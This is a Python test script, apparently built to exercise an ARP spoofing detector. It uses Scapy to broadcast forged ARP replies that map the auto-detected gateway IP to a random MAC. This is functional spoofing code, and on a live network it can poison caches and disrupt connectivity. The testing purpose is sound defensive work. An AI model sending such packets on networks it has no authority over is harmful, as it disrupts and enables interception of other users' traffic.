"""
Test Script - Simulates ARP Spoofing Attack

This script sends fake ARP replies to test the detection system
without needing a separate attacker machine.

WARNING: Only use on networks you own or have permission to test.

Usage:
    python test_detection.py
    python test_detection.py --count 5
    python test_detection.py --target-ip 192.168.0.103 --gateway-ip 192.168.0.1
"""

import argparse
import sys
import time
import random

try:
    from scapy.all import Ether, ARP, sendp, get_if_list, get_if_addr, conf
    from scapy.layers.l2 import getmacbyip
except ImportError:
    print("[Error] Scapy not installed. Run: pip install scapy")
    sys.exit(1)


def get_random_mac():
    return ":".join([f"{random.randint(0, 255):02x}" for _ in range(6)])


def detect_network():
    try:
        gateway_ip = conf.route.route("0.0.0.0")[2]
    except:
        gateway_ip = None

    local_ip = None
    for iface in get_if_list():
        addr = get_if_addr(iface)
        if addr and not addr.startswith("127."):
            local_ip = addr
            break

    return local_ip, gateway_ip


def send_fake_arp(gateway_ip, target_ip=None, interface=None, count=3, interval=1.0):
    fake_mac = get_random_mac()

    print(f"\n[Test] Simulating ARP Spoof Attack")
    print(f"  Gateway IP:   {gateway_ip}")
    print(f"  Fake MAC:     {fake_mac}")
    print(f"  Packets:      {count}")
    print(f"  Interval:     {interval}s")
    print()

    arp_reply = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
        op=2,
        psrc=gateway_ip,
        hwsrc=fake_mac,
        pdst=gateway_ip,
        hwdst="ff:ff:ff:ff:ff:ff"
    )

    print("[Test] Sending fake ARP replies...")

    for i in range(count):
        try:
            sendp(arp_reply, iface=interface, verbose=0)
            print(f"  [{i + 1}/{count}] Sent: {gateway_ip} is-at {fake_mac}")

            if i < count - 1:
                time.sleep(interval)
        except PermissionError:
            print("\n[Error] Permission denied. Run as administrator/root.")
            sys.exit(1)
        except Exception as e:
            print(f"\n[Error] Failed to send packet: {e}")
            sys.exit(1)

    print("\n[Test] Attack simulation complete.")
    print("[Test] If defense system is running, it should have detected this.")


def main():
    parser = argparse.ArgumentParser(
        description="Test ARP Spoofing Detection",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python test_detection.py                     Auto-detect and test
  python test_detection.py --count 10          Send 10 fake packets
  python test_detection.py --gateway-ip 192.168.0.1
        """
    )
    parser.add_argument(
        "--gateway-ip",
        type=str,
        default=None,
        help="Gateway IP to spoof (auto-detected if not specified)"
    )
    parser.add_argument(
        "--target-ip",
        type=str,
        default=None,
        help="Target IP (optional)"
    )
    parser.add_argument(
        "--interface",
        type=str,
        default=None,
        help="Network interface to use"
    )
    parser.add_argument(
        "--count",
        type=int,
        default=5,
        help="Number of fake ARP packets to send (default: 5)"
    )
    parser.add_argument(
        "--interval",
        type=float,
        default=1.0,
        help="Interval between packets in seconds (default: 1.0)"
    )

    args = parser.parse_args()

    local_ip, detected_gateway = detect_network()

    gateway_ip = args.gateway_ip or detected_gateway

    if not gateway_ip:
        print("[Error] Could not detect gateway IP. Please specify with --gateway-ip")
        sys.exit(1)

    print("\n" + "=" * 50)
    print("  ARP Spoof Attack Simulator")
    print("  FOR TESTING PURPOSES ONLY")
    print("=" * 50)

    send_fake_arp(
        gateway_ip=gateway_ip,
        target_ip=args.target_ip,
        interface=args.interface,
        count=args.count,
        interval=args.interval
    )


if __name__ == "__main__":
    main()